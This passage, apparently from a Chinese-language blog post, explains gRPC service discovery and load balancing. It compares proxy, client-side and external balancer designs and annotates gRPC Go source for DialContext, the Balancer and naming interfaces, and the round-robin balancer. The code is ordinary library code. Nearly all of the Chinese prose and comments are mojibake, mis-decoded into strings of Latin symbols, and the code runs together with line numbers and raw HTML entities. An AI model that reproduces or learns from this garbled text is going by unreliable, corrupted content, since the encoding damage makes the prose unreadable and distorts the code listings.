LB‰∏äÊúâÊâÄÊúâÊúçÂä°ÁöÑÂú∞ÂùÄÊò†Â∞ÑË°®ÔºåÈÄöÂ∏∏Áî±ËøêÁª¥ÈÖçÁΩÆÊ≥®ÂÜåÔºåÂΩìÊúçÂä°Ê∂àË¥πÊñπË∞ÉÁî®Êüê‰∏™ÁõÆÊ†áÊúçÂä°Êó∂ÔºåÂÆÉÂêëLBÂèëËµ∑ËØ∑Ê±ÇÔºåÁî±LB‰ª•ÊüêÁßçÁ≠ñÁï•ÔºåÊØîÂ¶ÇËΩÆËØ¢(Round-Robin)ÂÅöË¥üËΩΩÂùáË°°ÂêéÂ∞ÜËØ∑Ê±ÇËΩ¨ÂèëÂà∞ÁõÆÊ†áÊúçÂä°„ÄÇLB‰∏ÄËà¨ÂÖ∑Â§áÂÅ•Â∫∑Ê£ÄÊü•ËÉΩÂäõÔºåËÉΩËá™Âä®ÊëòÈô§‰∏çÂÅ•Â∫∑ÁöÑÊúçÂä°ÂÆû‰æã„ÄÇËØ•ÊñπÊ°àÁöÑÈóÆÈ¢ò: ÈÖçÁΩÆ‰∏çÊñπ‰æø: Âü∫Êú¨ÈÉΩ‰ΩøÁî®ÈÖçÁΩÆÊñá‰ª∂ÊàñËÄÖUIÁöÑÊñπÂºèÊìç‰Ωú, Âπ∂Ê≤°ÊúâÂèãÂ•ΩÁöÑAPIË∞ÉÁî®, ‰∏çÊñπ‰æøÈõÜÊàê Êâ©Â±ïÊÄß: È¢ÑÁïôÁöÑÊâ©Â±ïÁ©∫Èó¥‰∏çË∂≥, ‰∏çËÉΩÂæàÂ•ΩÁöÑÊ†πÊçÆËá™Â∑±ÁöÑÈúÄÊ±ÇÊâ©Â±ïÂäüËÉΩ, ‰ΩÜNginxÈô§Â§ñ ÊÄßËÉΩÊçüËÄó: Áî±‰∫éÈúÄË¶ÅÂ§çÂà∂ËØ∑Ê±ÇÂíåÂìçÂ∫î, ‰ºöÊúâ‰∏ÄÂÆöÁöÑÊÄßËÉΩÊçüËÄó, ÂØπ‰∫éÂ≠òÂÇ®ËøôÁßçÈáçÊúçÂä°Â∞±‰∏çÈÄÇÁî®‰∫Ü Âü∫‰∫éÂÆ¢Êà∑Á´ØÊ®°Âºè(Balancing-aware Client)ÈíàÂØπÁ¨¨‰∏Ä‰∏™ÊñπÊ°àÁöÑ‰∏çË∂≥ÔºåÊ≠§ÊñπÊ°àÂ∞ÜLBÁöÑÂäüËÉΩÈõÜÊàêÂà∞ÊúçÂä°Ê∂àË¥πÊñπËøõÁ®ãÈáåÔºå‰πüË¢´Áß∞‰∏∫ËΩØË¥üËΩΩÊàñËÄÖÂÆ¢Êà∑Á´ØË¥üËΩΩÊñπÊ°à, Âõ†Ê≠§ÂÆ¢Êà∑Á´Ø‰ºöÁï•Áé∞Èáç‰∏Ä‰∫õ, ÊØîÂ¶ÇÂÆ¢Êà∑Á´Ø‰ºöÂåÖÂê´ÂæàÂ§öË∞ÉÂ∫¶Á≠ñÁï•(Round Robin, Random, etc)Áî®‰∫é‰ªéserverÂàóË°®‰∏≠ÊåëÈÄâÂêàÈÄÇÁöÑserverËøõË°åË∞ÉÂ∫¶„ÄÇ Âú®ËøôÁßçÊ®°Âºè‰∏ã, ÊúçÂä°Âô®ÂàóË°®Â∞ÜÂú®ÂÆ¢Êà∑Á´Ø‰∏≠ÈùôÊÄÅÈÖçÁΩÆ, Áî±ÂêçÁß∞Ëß£ÊûêÁ≥ªÁªüÂíåÂ§ñÈÉ®Ë¥üËΩΩÂùáË°°Âô®Êèê‰æõ, Âú®‰ªª‰ΩïÊÉÖÂÜµ‰∏ã, ÂÆ¢Êà∑Á´ØË¥üË¥£‰ªéÂàóË°®‰∏≠ÈÄâÂèñÊúÄÂêàÈÄÇÁöÑserverËøõË°åË∞ÉÂ∫¶„ÄÇÂÖ∑‰ΩìÁöÑÂÆûÁé∞ËøáÁ®ãÂ¶Ç‰∏ã: ÊúçÂä°Êèê‰æõÊñπÂêØÂä®Êó∂ÔºåÈ¶ñÂÖàÂ∞ÜÊúçÂä°Âú∞ÂùÄÊ≥®ÂÜåÂà∞ÊúçÂä°Ê≥®ÂÜåË°®ÔºåÂêåÊó∂ÂÆöÊúüÊä•ÂøÉË∑≥Âà∞ÊúçÂä°Ê≥®ÂÜåË°®‰ª•Ë°®ÊòéÊúçÂä°ÁöÑÂ≠òÊ¥ªÁä∂ÊÄÅÔºåÁõ∏ÂΩì‰∫éÂÅ•Â∫∑Ê£ÄÊü• ÊúçÂä°Ê∂àË¥πÊñπË¶ÅËÆøÈóÆÊüê‰∏™ÊúçÂä°Êó∂ÔºåÂÆÉÈÄöËøáÂÜÖÁΩÆÁöÑLBÁªÑ‰ª∂ÂêëÊúçÂä°Ê≥®ÂÜåË°®Êü•ËØ¢ÔºåÂêåÊó∂ÁºìÂ≠òÂπ∂ÂÆöÊúüÂà∑Êñ∞ÁõÆÊ†áÊúçÂä°Âú∞ÂùÄÂàóË°®ÔºåÁÑ∂Âêé‰ª•ÊüêÁßçË¥üËΩΩÂùáË°°Á≠ñÁï•ÈÄâÊã©‰∏Ä‰∏™ÁõÆÊ†áÊúçÂä°Âú∞ÂùÄÔºåÊúÄÂêéÂêëÁõÆÊ†áÊúçÂä°ÂèëËµ∑ËØ∑Ê±Ç„ÄÇLBÂíåÊúçÂä°ÂèëÁé∞ËÉΩÂäõË¢´ÂàÜÊï£Âà∞ÊØè‰∏Ä‰∏™ÊúçÂä°Ê∂àË¥πËÄÖÁöÑËøõÁ®ãÂÜÖÈÉ®ÔºåÂêåÊó∂ÊúçÂä°Ê∂àË¥πÊñπÂíåÊúçÂä°Êèê‰æõÊñπ‰πãÈó¥ÊòØÁõ¥Êé•Ë∞ÉÁî®ÔºåÊ≤°ÊúâÈ¢ùÂ§ñÂºÄÈîÄÔºåÊÄßËÉΩÊØîËæÉÂ•Ω„ÄÇ ËØ•ÊñπÊ°à‰∏ªË¶ÅÈóÆÈ¢òÔºö ÂºÄÂèëÊàêÊú¨ÔºåÁºñÂÜôÂíåÁª¥Êä§Â§öÁßçËØ≠Ë®ÄÊàñÂÆ¢Êà∑Á´ØÁöÑË¥üËΩΩÂùáË°°Á≠ñÁï•, ‰ºöÊúâÂÜó‰Ωô, ËÄå‰∏î‰πüÂ¢ûÂä†‰∫ÜÂºÄÂèëÊàêÊú¨ÂíåÁª¥Êä§ÊàêÊú¨„ÄÇ Â¢ûÂä†ÂÆ¢Êà∑Á´ØÂ§çÊùÇÊÄßÔºåËøô‰∫õË¥üËΩΩÂùáË°°Á≠ñÁï• ÊúâÂèØËÉΩËøòÈúÄË¶ÅÂíåÊúçÂä°Á´ØËøõË°å‰∏Ä‰∫õÈ¢ùÂ§ñÁöÑÈÄö‰ø°, ÊØîÂ¶ÇÁõëÊéßÁä∂ÊÄÅÊ£ÄÊü•, Ë¥üËΩΩ‰ø°ÊÅØ, ÂÆÉÂ∞Ü‰ΩøÂæóÂÆ¢Êà∑Á´Ø‰ª£Á†ÅÂ§çÊùÇÂåñ„ÄÇ Â§ñÈÉ®Ë¥üËΩΩÂùáË°°Âô®ÈíàÂØπÂÆ¢Êà∑Á´ØËøáÈáçÁöÑÈóÆÈ¢ò, Êúâ‰∫ÜÁ¨¨‰∏âÁßçÊñπÂºè: Â§çÊùÇÁöÑË∞ÉÂ∫¶ÁÆóÊ≥ïÁã¨Á´ãÊàêLB, Áî±Â§ñÈÉ®Êèê‰æõ„ÄÇËÄåÂÆ¢Êà∑Á´Ø‰øùÊåÅÁÆÄÂçïÂíåÂèØÁßªÊ§ç,‰ªÖÂÆûÁé∞‰∏Ä‰∫õÂü∫Êú¨ÁöÑserverÊåëÈÄâÁÆóÊ≥ïÊØîÂ¶Ç Round Robin, ËÄåÂÆ¢Êà∑Á´Ø‰æùËµñLBÊèê‰æõË¥üËΩΩÂùáË°°ÁöÑÈÖçÁΩÆÂíåÂÆ¢Êà∑Á´ØÈúÄË¶ÅÂèëÈÄÅËØ∑Ê±ÇÁöÑserverÂàóË°®, LBÈúÄË¶ÅÊ†πÊçÆÈúÄË¶ÅÊõ¥Êñ∞serverÂàóË°®,‰ª•Âπ≥Ë°°Ë¥üËΩΩ, Â§ÑÁêÜserver‰∏çÂèØÁî®ÊàñËÄÖÂÅ•Â∫∑ÈóÆÈ¢ò. Êû∂ÊûÑgRPC‰∏ªË¶ÅÈááÁî®Â§ñÈÉ®Ë¥üËΩΩÂùáË°°ÁöÑÊñπÂºè, Âõ†gRPCÂÆûÁé∞‰∫ÜÁÆÄÂçïÊúçÂä°ÊåëÈÄâÁÆóÊ≥ï: Round Robin, ÂêåÊó∂‰πüÊèê‰æõ‰∫Ü‰∏ÄÁßçÂ§ñÈÉ®LBÁÆóÊ≥ïÁöÑÂèÇËÄÉÂÆûÁé∞: grpclb, ÂÆòÊñπÂπ∂‰∏çÂª∫ËÆÆ ÂÜçÂæÄÈáåÈù¢Ê∑ªÂä†Êõ¥Â§öÁöÑÁÆóÂèë, ËÄåÊõ¥Â§öÁöÑÁÆóÊ≥ïÈúÄË¶ÅÈÄöËøáÂ§ñÈÉ®LBÊèê‰æõÂÆûÁé∞„ÄÇ Â∑•‰ΩúÊµÅÁ®ãÂ§ßËá¥Â¶Ç‰∏ã: ÊúçÂä°ÂêØÂä®ÂêégRPCÂÆ¢Êà∑Á´ØÂêëÂëΩÂêçÊúçÂä°Âô®ÂèëÂá∫ÂêçÁß∞Ëß£ÊûêËØ∑Ê±ÇÔºåÂêçÁß∞Â∞ÜËß£Êûê‰∏∫‰∏Ä‰∏™ÊàñÂ§ö‰∏™IPÂú∞ÂùÄÔºåÊØè‰∏™IPÂú∞ÂùÄÊ†áÁ§∫ÂÆÉÊòØÊúçÂä°Âô®Âú∞ÂùÄËøòÊòØË¥üËΩΩÂùáË°°Âô®Âú∞ÂùÄÔºå‰ª•ÂèäÊ†áÁ§∫Ë¶Å‰ΩøÁî®ÈÇ£‰∏™ÂÆ¢Êà∑Á´ØË¥üËΩΩÂùáË°°Á≠ñÁï•ÊàñÊúçÂä°ÈÖçÁΩÆ„ÄÇËÄåÂÆ¢Êà∑Á´ØÊèê‰æõÁöÑË¥üËΩΩÂùáË°°Á≠ñÁï•Êúâround_robinÂíågrpclb ÂÆ¢Êà∑Á´ØÂÆû‰æãÂåñË¥üËΩΩÂùáË°°Á≠ñÁï•ÔºåÂ¶ÇÊûúËß£ÊûêËøîÂõûÁöÑÂú∞ÂùÄÊòØË¥üËΩΩÂùáË°°Âô®Âú∞ÂùÄÔºåÂàôÂÆ¢Êà∑Á´ØÂ∞Ü‰ΩøÁî®grpclbÁ≠ñÁï•ÔºåÂê¶ÂàôÂÆ¢Êà∑Á´Ø‰ΩøÁî®ÊúçÂä°ÈÖçÁΩÆËØ∑Ê±ÇÁöÑË¥üËΩΩÂùáË°°Á≠ñÁï•,Â¶ÇÊûúÊ≤°Êúâ‰ªéÊúçÂä°ÈÖçÁΩÆÊñá‰ª∂‰∏≠Ëß£ÊûêÂà∞Ë¥üËΩΩÂùáË°°Á≠ñÁï•, ÂàôÂÆ¢Êà∑Á´Ø‰ºöÈÄâÊã©Á¨¨‰∏Ä‰∏™ÂèØÁî®ÁöÑÊúçÂä°Âú∞ÂùÄ„ÄÇ Ë¥üËΩΩÂùáË°°Á≠ñÁï•‰∏∫ÊØè‰∏™ÊúçÂä°Âô®Âú∞ÂùÄÂàõÂª∫‰∏Ä‰∏™Â≠êÈÄöÈÅìÔºàchannelÔºâ„ÄÇ ÂΩìÊúârpcËØ∑Ê±ÇÊó∂ÔºåË¥üËΩΩÂùáË°°Á≠ñÁï•ÂÜ≥ÂÆöÈÇ£‰∏™Â≠êÈÄöÈÅìÂç≥grpcÊúçÂä°Âô®Â∞ÜÊé•Êî∂ËØ∑Ê±ÇÔºåÂΩìÂèØÁî®ÊúçÂä°Âô®‰∏∫Á©∫Êó∂ÂÆ¢Êà∑Á´ØÁöÑËØ∑Ê±ÇÂ∞ÜË¢´ÈòªÂ°û„ÄÇ Ê∫êÁ†ÅËß£ËØª‰∏ªË¶ÅÁúãÂÆòÊñπÂ¶Ç‰ΩïÂÆûÁé∞round robinËøô‰∏™Ë¥üËΩΩÂùáË°°Âô®ÂíåË¥üËΩΩÂùáË°°Â∑•‰ΩúÊµÅÁ®ã„ÄÇ Âª∫Á´ãËøûÊé•Âú®clientconn.goÁöÑDialContextÂáΩÊï∞‰∏≠ÊèèËø∞‰∫ÜÂÆ¢Êà∑Á´ØËøûÊé•ËøûÊé•ÁöÑËøáÁ®ã1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950// ctx: ‰∏ä‰∏ãÊñáÁî®‰∫éÂ§ÑÁêÜËØ∑Ê±ÇÂèñÊ∂àÂíåËØ∑Ê±ÇË∂ÖÊó∂Á≠âÊÉÖÂÜµ// target: ÈÄöËøáËøô‰∏™Âª∫Á´ãËøûÊé•, Â¶ÇÊûúÈááÁî®Ë¥üËΩΩÂùáË°°Ê®°Âºè, ‰ªñ‰ª£Ë°®watcherÂú∞ÂùÄ, Áî®‰∫éwatchÊúçÂä°Á´ØÂú∞ÂùÄÂèòÂåñ// opts: ÂÖ∂‰ªñÂª∫Á´ãËøûÊé•Êó∂ÁöÑÂèÇÊï∞func DialContext(ctx context.Context, target string, opts ...DialOption) (conn *ClientConn, err error) &#123;...... //ÁúÅÁï•go func() &#123; var addrs []Address if cc.dopts.balancer == nil &#123; //Â¶ÇÊûúÊ≤°ÊúâËÆæÁΩÆË¥üËΩΩÂùáË°°Âô®ÔºåÂàôÁõ¥Êé•ËøûÊé• addrs = append(addrs, Address&#123;Addr: target&#125;) &#125; else &#123; var credsClone credentials.TransportCredentials if creds != nil &#123; credsClone = creds.Clone() &#125; config := BalancerConfig&#123; DialCreds: credsClone, &#125; //ÂêØÂä®‰∏Ä‰∏™Ë¥üËΩΩÂùáË°°Âô®,startÂáΩÊï∞‰ºöÂêØÂä®‰∏Ä‰∏™watchÁõëÂê¨Âú∞ÂùÄÁöÑÂèòÂåñ. if err := cc.dopts.balancer.Start(target, config); err != nil &#123; waitC &lt;- err return &#125; // NotifyËøîÂõû‰∏Ä‰∏™ÈÄöÈÅìÔºåÂú®ÊØèÊ¨°ÊúçÂä°Âô®Âú∞ÂùÄÂèòÂåñÂêéÁöÑÊúÄÊñ∞Âú∞ÂùÄ‰ø°ÊÅØ. ch := cc.dopts.balancer.Notify() if ch == nil &#123; // There is no name resolver installed. addrs = append(addrs, Address&#123;Addr: target&#125;) &#125; else &#123; addrs, ok = &lt;-ch if !ok || len(addrs) == 0 &#123; waitC &lt;- errNoAddr return &#125; &#125; &#125; //ÂØπÊØè‰∏Ä‰∏™Âú∞ÂùÄËøõË°åËøûÊé•, Âõ†‰∏∫ËøôÊòØÂÆ¢Êà∑Á´ØÂêØÂä®Êó∂ÔºåÊâÄ‰ª•ÈúÄË¶ÅÂØπÊâÄÊúâÂú∞ÂùÄÊìç‰Ωú. for _, a := range addrs &#123; if err := cc.resetAddrConn(a, false, nil); err != nil &#123; waitC &lt;- err return &#125; &#125; close(waitC)&#125;().............. //ÁúÅÁï•‰∏Ä‰∫õ‰ª£Á†Åif ok &#123; //ËøôÈáåÂºÄÂêØ‰∏Ä‰∏™ÁõëÂê¨goroutineÔºå‰∏ªË¶ÅÊòØÁõëÂê¨ÊúçÂä°Âô®Âú∞ÂùÄÂèòÂåñÂπ∂ÂØπÊñ∞ÁöÑÂú∞ÂùÄÂª∫Á´ãËøûÊé•ÔºåÂØπËÄÅÁöÑÂú∞ÂùÄÂÖ≥Èó≠ËøûÊé• go cc.lbWatcher()&#125; ‰ªéÈáåÈù¢ÂèØ‰ª•ÁúãÂá∫ÂÖ≥‰∫éË¥üËΩΩÂùáË°°ÈÉ®ÂàÜ, ‰ΩøÁî®balancerÁöÑStartÊù•ÂêØÂä®Âú∞ÂùÄÁõëÂê¨, NotifyÊù•Ëé∑ÂèñÂú∞ÂùÄÂèòÂåñ, Âõ†Ê≠§Ê†∏ÂøÉÊòØÁêÜËß£BalancerÊé•Âè£„ÄÇ Ë¥üËΩΩÂùáË°°Êé•Âè£Âú®balancer.go‰∏≠ÊúâÂÖ≥‰∫éÊ≠§ÁöÑÂÆö‰πâ:123456789101112131415161718192021222324// Balancer ‰∏∫RPCsÈÄâÊã©ÁΩëÁªúÂú∞ÂùÄ(backend service) type Balancer interface &#123; //ÂêØÂä®‰∏Ä‰∏™Ë¥üËΩΩÂùáË°°ÔºåÂÜÖÈÉ®‰ºöÂêØÂä®‰∏Ä‰∏™ÂêçÁß∞ÊúçÂä°Âô®ÁöÑwatcherÔºå‰∏çÊñ≠ÁõëÂê¨Âú∞ÂùÄÁöÑÂèòÂåñ Start(target string, config BalancerConfig) error // ÈÄöÁü•Balancer gRPCÈÄöËøáËØ•Âú∞ÂùÄÂª∫Á´ã‰∫Ü‰∏Ä‰∏™ÂíåserverÁöÑËøûÊé•, ËøîÂõû‰∏Ä‰∏™downÁöÑÂáΩÊï∞, ÂΩìËøûÊé•Êñ≠ÂºÄÊàñËÄÖ‰∏¢Â§±‰ºöË¢´Ë∞ÉÁî®„ÄÇ Up(addr Address) (down func(error)) // Ëé∑Âæó‰∏ã‰∏ÄÊ¨°ËøûÊé•ÊúçÂä°Âô®ÁöÑÂú∞ÂùÄ // 1) Â¶ÇÊûúËøîÂõû‰∏Ä‰∏™Â∑≤ÁªèÂª∫Á´ãËøûÊé•ÁöÑÂú∞ÂùÄ, RPCÂ∞ÜÂü∫‰∫éËØ•ËøûÊé•Áõ¥Êé•ËøõË°åË∞ÉÁî® // 2) Â¶ÇÊûúËøîÂõû‰∏Ä‰∏™Ê≠£Âú®ËøûÊé•Âª∫Á´ã‰∏≠ÁöÑÂú∞ÂùÄ(NotifyÂàùÂßãÂåñÊó∂ÂèëÁîüËøáÊù•ÁöÑ),‰ΩÜÊòØËøòÊú™ÂÆåÊàêËøûÊé•Âª∫Á´ãÔºåRPCË∞ÉÁî®ÂèØËÉΩ‰ºöÂ§±Ë¥•ÊàñËÄÖÊàêÂäü // 3) Â¶ÇÊûúËøîÂõû‰∏Ä‰∏™‰∏çÂ≠òÂú®ÁöÑËøûÊé•, ‰ºöÂΩìÂÅö‰∏Ä‰∏™ÈîôËØØÂíåÂ§±Ë¥•ÁöÑÁõ∏Â∫îÁöÑRPC // Âõ†Ê≠§Â¶ÇÊûúÊÉ≥Ë¶ÅÂÆûÁé∞‰∏Ä‰∏™Ëá™ÂÆö‰πâÁöÑBalancer, Âª∫ËÆÆÈÅµÂæ™Â¶Ç‰∏ãËßÑÂàô // 1) Â¶ÇÊûúopts.BlockingWait‰∏∫true, ÈúÄË¶ÅËøîÂõû‰∏Ä‰∏™Â∑≤ÁªèÂª∫Á´ãËøûÊé•ÁöÑÂú∞ÂùÄÊàñËÄÖÈòªÂ°ûÂà∞Áõ¥Âà∞ÊúâÂª∫Á´ãËøûÊé•ÁöÑÂú∞ÂùÄÊó∂ËøîÂõû, ÂΩìÈòªÂ°ûÊó∂ // ÈúÄË¶ÅÊ£ÄÊµãË∂ÖÊó∂ÊàñËÄÖÂèñÊ∂àËØ•RPC // 2) Â¶ÇÊûúopts.BlockingWait‰∏∫false, ÂÆÉÂ∫îËØ•Á´ãÂç≥ÈÄöËøáÈÄöÁü•Êú∫Âà∂(Nofify)ËøîÂõû‰∏Ä‰∏™Âú∞ÂùÄÔºåËÄå‰∏çÊòØÈòªÂ°û„ÄÇ // // putÁî®‰∫éÊî∂ÈõÜÂíåÊä•ÂëäRPCÁöÑÁä∂ÊÄÅÁªôËøúÁ®ãÁöÑLB Get(ctx context.Context, opts BalancerGetOptions) (addr Address, put func(), err error) // ËøîÂõû‰∏Ä‰∏™channelÁî®‰∫éÂÆûÊó∂Ëé∑ÂèñÈúÄË¶ÅÂª∫Á´ãËøûÊé•ÁöÑÂú∞ÂùÄÂàóË°®, Ëøô‰∫õÂú∞ÂùÄÂèØËÉΩÊù•Ê∫ê‰∫é‰∏Ä‰∏™name resoverÊàñËÄÖ‰∏Ä‰∏™remote LB, // gRPCÂ∞Ü‰∏é‰πãÂâç‰øùÂ≠òÁöÑËøûÊé•Âú∞ÂùÄËøõË°åÊØîËæÉ, Â¶ÇÊûúËØ•Âú∞ÂùÄÂàóË°®ÊúâÊñ∞Â¢ûÁöÑ, gRPCÂØπÊñ∞Â¢ûÁöÑÂú∞ÂùÄËøõË°åËøûÊé•, Â¶ÇÊûúËØ•Âú∞ÂùÄÊúâÂáèÂ∞ë, gRPC‰ºö‰ºòÈõÖÂÖ≥Èó≠Ëøô // ÂáèÂ∞ëÁöÑËøûÊé•, Â¶ÇÊûúÊ≤°ÂèòÂåñ, gRPCÊó†Âä®‰Ωú, Ê≥®ÊÑèchannelÈáåÈù¢ËøîÂõûÁöÑ‰∏Ä‰∏™ ÂÆåÊï¥ÁöÑÂú∞ÂùÄÂàóË°®, ËÄå‰∏çÊòØÂ¢ûÈáè„ÄÇ Notify() &lt;-chan []Address //ÂÖ≥Èó≠Ë¥üËΩΩÂùáË°°Âô® Close() error&#125; ÂÆòÊñπÂÆûÁé∞ÂÆòÊñπÁöÑRound RobinÂ∞±ÊòØBalancerÊé•Âè£ÁöÑ‰∏Ä‰∏™ÂÆûÁé∞, ‰ΩÜÊòØÂú®Áúã‰ªñÂ¶Ç‰ΩïÂÆûÁé∞StartÂíåNotify‰πãÂâç, ÂÖàÁúãÁúãÂêçÁß∞Ëß£ÊûêÊúçÂä°ÁöÑÊé•Âè£ÂÆö‰πâ. ÂêçÁß∞Ëß£ÊûêÊúçÂä°ÂêçÁß∞Ëß£ÊûêÊúçÂä°: naming.go, ËØ•ÂåÖÂÆö‰πâ‰∫ÜgRPCÂêçÁß∞Ëß£ÊûêÊúçÂä°ÁöÑAPIÂíåÁõ∏ÂÖ≥Êï∞ÊçÆÁªìÊûÑ12345678910111213141516171819202122232425262728293031323334353637// Operation ÂÆö‰πâ‰∫ÜÂêçÁß∞Ëß£ÊûêÊó∂Áõ∏Â∫îÁöÑÂä®‰Ωú.type Operation uint8const ( // Add Ë°®Á§∫Êñ∞Â¢ûÂú∞ÂùÄÁöÑÊìç‰Ωú Add Operation = iota // Delete Ë°®Á§∫ÈúÄË¶ÅÂà†Èô§‰∏Ä‰∏™Â∑≤Â≠òÂú®Âú∞ÂùÄÁöÑÊìç‰Ωú Delete)// Update defines a name resolution update. Notice that it is not valid having both// empty string Addr and nil Metadata in an Update.type Update struct &#123; // ÂÖ∑‰ΩìÁöÑÊõ¥Êñ∞Âä®‰Ωú, ÊØîÂ¶Ç‰∏äÈù¢ÂÆö‰πâÁöÑAddÊàñËÄÖDelete Op Operation // ÈúÄË¶ÅÊõ¥Êñ∞ÁöÑÂú∞ÂùÄ, Â¶ÇÊûú‰∏∫Á©∫Â≠óÁ¨¶‰∏≤, Ë°®Á§∫ËøôÂÑøÊ≤°ÊúâÂú∞ÂùÄÈúÄË¶ÅÊõ¥Êñ∞ Addr string // Áî®‰∫éÊèèËø∞updatedÊìç‰ΩúÊó∂ÁöÑ‰∏Ä‰∫õmetaÊï∞ÊçÆ, Â¶ÇÊûúÊòØËá™Â∑±ÂÆûÁé∞ÂêçÁß∞Ëß£ÊûêÊúçÂä°MetadataÊòØ‰∏çÈúÄË¶Å‰º†ÂÖ•ÁöÑ„ÄÇ Metadata interface&#123;&#125;&#125;// Resolver creates a Watcher for a target to track its resolution changes.type Resolver interface &#123; // ÈÄöËøá‰∏Ä‰∏™ÂêçÂ≠óÂæóÂà∞‰∏Ä‰∏™watcherÔºåÁõëÂê¨ÊúçÂä°Âô®Âú∞ÂùÄÂèòÂåñ„ÄÇ Resolve(target string) (Watcher, error)&#125;// Watcher watches for the updates on the specified target.type Watcher interface &#123; // Next blocks until an update or error happens. It may return one or more // updates. The first call should get the full set of the results. It should // return an error if and only if Watcher cannot recover. // ÂæóÂà∞‰∏ãÊ¨°Êõ¥Êñ∞ÁöÑÂú∞ÂùÄ Next() ([]*Update, error) // Close closes the Watcher. Close()&#125; round robin balancerÂú®‰∫ÜËß£‰∫ÜÂêçÁß∞Ëß£ÊûêÊúçÂä°Êé•Âè£ËøáÂêé, ÁúãÁúãround robinÁöÑÂÖ∑‰ΩìÂÆûÁé∞:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899type roundRobin struct &#123; r naming.Resolver w naming.Watcher addrs []*addrInfo // ÂÆ¢Êà∑Á´ØÂ∫îËØ•ËøûÊé•ÁöÑÊâÄÊúâÂú∞ÂùÄ mu sync.Mutex addrCh chan []Address // ÊúçÂä°Âú∞ÂùÄÂàóË°®Êõ¥Êñ∞ÈÄöÁü•channel next int // index of the next address to return for Get() waitCh chan struct&#123;&#125; // the channel to block when there is no connected address available done bool // The Balancer is closed.&#125;func (rr *roundRobin) Start(target string, config BalancerConfig) error &#123; rr.mu.Lock() defer rr.mu.Unlock() if rr.done &#123; return ErrClientConnClosing &#125; if rr.r == nil &#123; // Â¶ÇÊûúÊ≤°Êúâ‰ΩøÁî®ÂêçÁß∞Ëß£ÊûêÊúçÂä°, Â∞Ü‰∏ç‰ºöËøõË°åÂêçÁß∞Ëß£Êûê, Âú®ËøôÁßçÊÉÖÂÜµ‰∏ãtargetÂ∞Ü‰ºö‰Ωú‰∏∫ÂîØ‰∏ÄÂèØÁî®ÁöÑÂú∞ÂùÄË¢´ÊîæÂÖ• // rr.addrs Ë¢´ÂÆ¢Êà∑Á´Ø‰ΩøÁî®, Ê≠§Êó∂addrChÂ∞ÜÊ≤°ÊúâÂú∞ÂùÄ, ÂßãÁªà‰∏∫nil rr.addrs = append(rr.addrs, &amp;addrInfo&#123;addr: Address&#123;Addr: target&#125;&#125;) return nil &#125; // Â¶ÇÊûúÂêçÁß∞Ëß£ÊûêÊúçÂä°Â≠òÂú®Â∞Ü‰ºöË∞ÉÁî®ÂêçÁß∞Ëß£ÊûêÊúçÂä°ÁöÑResolveÊñπÊ≥ï, ÁîüÊàê‰∏Ä‰∏™watcher w, err := rr.r.Resolve(target) if err != nil &#123; return err &#125; rr.w = w rr.addrCh = make(chan []Address) // ÂêØ‰∏Ä‰∏™GoroutineÊù•‰∏ìÈó®Êõ¥Êñ∞Âú∞ÂùÄÂà∞addrCh go func() &#123; for &#123; if err := rr.watchAddrUpdates(); err != nil &#123; return &#125; &#125; &#125;() return nil&#125;func (rr *roundRobin) watchAddrUpdates() error &#123; // Ëé∑ÂèñÈúÄË¶ÅÊõ¥Êñ∞ÁöÑÂú∞ÂùÄ updates, err := rr.w.Next() if err != nil &#123; grpclog.Printf("grpc: the naming watcher stops working due to %v.\n", err) return err &#125; rr.mu.Lock() defer rr.mu.Unlock() for _, update := range updates &#123; addr := Address&#123; Addr: update.Addr, Metadata: update.Metadata, &#125; switch update.Op &#123; // Â¶ÇÊûúÂú∞ÂùÄÊ≤°ÊúâÈáçÂ§ç, ÂàôÊ∑ªÂä†Âà∞Âú∞ÂùÄÂàóË°®‰∏≠Âéª(rr.addrs) case naming.Add: var exist bool for _, v := range rr.addrs &#123; if addr == v.addr &#123; exist = true grpclog.Println("grpc: The name resolver wanted to add an existing address: ", addr) break &#125; &#125; if exist &#123; continue &#125; rr.addrs = append(rr.addrs, &amp;addrInfo&#123;addr: addr&#125;) // ‰ªéÂú∞ÂùÄÂàóË°®‰∏≠(rr.addrs)ÁßªÈô§Â∑≤ÁªèÂ≠òÂú®ÁöÑÂú∞ÂùÄ case naming.Delete: for i, v := range rr.addrs &#123; if addr == v.addr &#123; copy(rr.addrs[i:], rr.addrs[i+1:]) rr.addrs = rr.addrs[:len(rr.addrs)-1] break &#125; &#125; default: grpclog.Println("Unknown update.Op ", update.Op) &#125; &#125; // Make a copy of rr.addrs and write it onto rr.addrCh so that gRPC internals gets notified. open := make([]Address, len(rr.addrs)) for i, v := range rr.addrs &#123; open[i] = v.addr &#125; if rr.done &#123; return ErrClientConnClosing &#125; rr.addrCh &lt;- open return nil&#125;// Áõ¥Êé•ËøîÂõûÂú∞ÂùÄÂèòÊõ¥ÁöÑchannel(Ê≥®ÊÑèÂú∞ÂùÄ‰∏çÊòØÂ¢ûÈáèÊòØÂÖ®Èáè)func (rr *roundRobin) Notify() &lt;-chan []Address &#123; return rr.addrCh&#125; ‰ª£Á†ÅÂÆûÁé∞Ê†πÊçÆgRPCÂÆòÊñπÊèê‰æõÁöÑËÆæËÆ°ÊÄùË∑ØÔºåÂü∫‰∫éËøõÁ®ãÂÜÖLBÊñπÊ°à(Âç≥Á¨¨2‰∏™Ê°àÔºåÈòøÈáåÂºÄÊ∫êÁöÑÊúçÂä°Ê°ÜÊû∂ Dubbo ‰πüÊòØÈááÁî®Á±ª‰ººÊú∫Âà∂)ÔºåÁªìÂêàÂàÜÂ∏ÉÂºè‰∏ÄËá¥ÁöÑÁªÑ‰ª∂ÔºàÂ¶ÇZookeeper„ÄÅConsul„ÄÅEtcdÔºâÔºåÂèØÊâæÂà∞gRPCÊúçÂä°ÂèëÁé∞ÂíåË¥üËΩΩÂùáË°°ÁöÑÂèØË°åËß£ÂÜ≥ÊñπÊ°à„ÄÇÊ†πÊçÆÂÆòÊñπÂ∑≤ÁªèÂÆûÁé∞Round RobinË¥üËΩΩÂùáË°°Âô®, 